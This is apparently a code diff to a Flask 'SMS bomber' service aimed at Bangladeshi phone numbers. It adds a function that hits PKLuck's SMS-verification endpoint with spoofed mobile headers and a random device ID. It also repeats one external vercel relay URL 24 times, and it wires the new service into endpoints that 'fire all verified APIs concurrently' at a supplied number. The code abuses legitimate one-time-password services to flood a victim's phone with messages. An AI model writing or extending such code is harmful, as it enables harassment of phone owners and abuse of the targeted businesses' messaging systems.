@@ -20,7 +20,7 @@ app = Flask(__name__)
 # =====================================================================
 # ⚙️ GLOBAL CONFIGURATION (এখানে টাইমআউট বদলাবেন)
 # =====================================================================
-DEFAULT_TIMEOUT = 10  # সেকেন্ড পরিবর্তন করতে চাইলে এখানে বদলান (যেমন: 5, 10 বা None)
+DEFAULT_TIMEOUT = 30  # সেকেন্ড পরিবর্তন করতে চাইলে এখানে বদলান (যেমন: 5, 10 বা None)
 
 
 # =====================================================================
@@ -129,6 +129,42 @@ def svc_mojaru(phone):
 # =====================================================================
 # 3. VERIFIED ACTIVE SERVICES
 # =====================================================================
+
+# 🆕 PKLuck Verification
+def svc_pkluck(phone):
+    url = "https://www.pkluck2.com/wps/verification/sms/register"
+    payload = {
+        "mobileNo": get_local11(phone),
+        "countryDialingCode": "880"
+    }
+    device_id = str(uuid.uuid4())
+    headers = {
+        'User-Agent': "Mozilla/5.0 (Linux; Android 10; RMX2030 Build/QKQ1.200209.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/152.0.7977.64 Mobile Safari/537.36",
+        'Accept': "application/json, text/plain, */*",
+        'Content-Type': "application/json",
+        'x-real-ua': "TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgyMDMwIEJ1aWxkL1FLUTEuMjAwMjA5LjAwMikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgRHJmZXUvNC4wIENocm9tZS8xNTIuMC43OTc3LjY0IE1vYmlsZSBTYWZhcmkvNTM3LjM2",
+        'language': "BN",
+        'sec-ch-ua-platform': '"Android"',
+        'authorization': "",
+        'sec-ch-ua': '"Chromium";v="152", "Not?A_Brand";v="24", "Android WebView";v="152"',
+        'sec-ch-ua-mobile': "?1",
+        'merchant': "pklubdtf4",
+        'moduleid': "REGMOBVERF3",
+        'origin': "https://www.pkluck2.com",
+        'x-requested-with': "com.mycompany.app.soulbrowser",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'referer': "https://www.pkluck2.com/m/register",
+        'accept-language': "en-US,en;q=0.9",
+        'priority': "u=1, i",
+        'Cookie': f"SHELL_deviceId={device_id}"
+    }
+    try:
+        r = requests.post(url, json=payload, headers=headers, timeout=DEFAULT_TIMEOUT)
+        return {"service": "PKLuck", "status_code": r.status_code, "success": r.status_code in [200, 201], "response": parse_resp(r)}
+    except Exception as e:
+        return {"service": "PKLuck", "status_code": None, "success": False, "error": str(e)}
 
 def svc_paperfly(phone):
     headers = {"accept": "application/json, text/plain, */*", "content-type": "application/json", "origin": "https://go.paperfly.com.bd", "referer": "https://go.paperfly.com.bd/", "device_identifier": "undefined", "device_name": "undefined", "user-agent": "Mozilla/5.0"}
@@ -631,9 +667,30 @@ EXTERNAL_URL_APIS = [
     "https://api3-sepia.vercel.app/send?phone=",
     "https://api4-beta.vercel.app/send?phone=",
     "https://api5-teal.vercel.app/send?phone=",
-    "https://gxsend.vercel.app/run-all1?phone=",
-    "https://gxsend.vercel.app/run-all2?phone=",
-    "https://gxsend.vercel.app/run-all3?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone=",
+    "https://gxsend.vercel.app/run-all?phone="
 ]
 
 def send_external_custom_url(url_template, phone):
@@ -669,6 +726,7 @@ MASTER_SERVICES = {
     "mojaru": svc_mojaru,
 
     # 📱 Fast & Responsive Core Providers
+    "pkluck": svc_pkluck,          # 🆕 Newly Added PKLuck
     "paperfly": svc_paperfly,
     "ostad": svc_ostad,
     "timezone": svc_timezone,
@@ -788,7 +846,7 @@ def home():
         "endpoints": {
             "/send?phone=017XXXXXXXX": "Fires all verified APIs concurrently",
             "/run-all?phone=017XXXXXXXX": "Alias for /send",
-            "/run?phone=017XXXXXXXX&apis=paperfly,ostad,dncrp": "Runs selective APIs"
+            "/run?phone=017XXXXXXXX&apis=pkluck,paperfly,ostad,dncrp": "Runs selective APIs"
         }
     })
 
@@ -819,7 +877,7 @@ def send_selected_route():
 
     local11 = get_local11(phone)
     if not local11 or len(local11) != 11:
-        return jsonify({"success": False, "error": "Invalid phone. Usage: /run?phone=017XXXXXXXX&apis=paperfly,ostad"}), 400
+        return jsonify({"success": False, "error": "Invalid phone. Usage: /run?phone=017XXXXXXXX&apis=pkluck,paperfly,ostad"}), 400
 
     if isinstance(apis_param, list):
         keys = [str(x).strip() for x in apis_param]
